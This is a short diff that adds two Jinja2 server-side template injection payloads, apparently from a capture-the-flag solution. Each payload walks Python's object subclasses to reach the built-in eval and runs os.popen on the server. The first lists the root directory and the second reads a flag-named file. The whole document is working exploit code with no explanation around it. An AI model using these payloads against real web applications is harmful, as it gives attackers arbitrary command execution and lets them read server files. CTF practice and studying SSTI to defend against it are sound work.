@@ -1,0 +1,3 @@
+{{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__(\"os\").popen(\"ls /\").read()") }}
+
+{{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__(\"os\").popen(\"cat /th1s_15_fl4ggggggg\").read()") }}
